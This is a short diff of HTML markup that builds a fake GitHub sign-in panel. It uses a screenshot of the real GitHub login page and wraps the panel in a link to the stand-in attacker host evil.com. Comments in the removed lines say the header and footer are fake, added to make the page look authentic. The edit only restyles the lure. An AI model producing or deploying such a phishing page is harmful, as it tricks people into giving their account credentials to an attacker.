@@ -1,21 +1,13 @@
-<div align="center">
-  <a href="https://evil.com" style="text-decoration: none; color: inherit; display: block; width: 100%;">
-
-    <!-- Top Fake Header to look like a real app -->
+<center>
+  <a href="https://evil.com">
     <br>
-    <h2 style="margin-bottom: 5px;">Sign in to GitHub</h2>
-    <p style="font-size: 14px; color: #8b949e; margin-top: 0;">to continue to your account</p>
+    <b>Sign in to GitHub</b>
     <br>
-
-    <!-- The Image (The core visual) -->
+    <font size="2" color="gray">to continue to your account</font>
+    <br><br>
     <img src="https://image.thum.io/get/width/1300/https://github.com/login" width="100%" alt="GitHub Login">
-    
-    <!-- Fake Bottom Disclaimer to make it look authentic -->
-    <br>
-    <p style="font-size: 11px; color: #8b949e; margin-top: 15px;">
-      Secure login • Terms • Privacy
-    </p>
-    <br>
-
+    <br><br>
+    <font size="1" color="gray">Secure login • Terms • Privacy</font>
+    <br><br>
   </a>
-</div>
+</center>
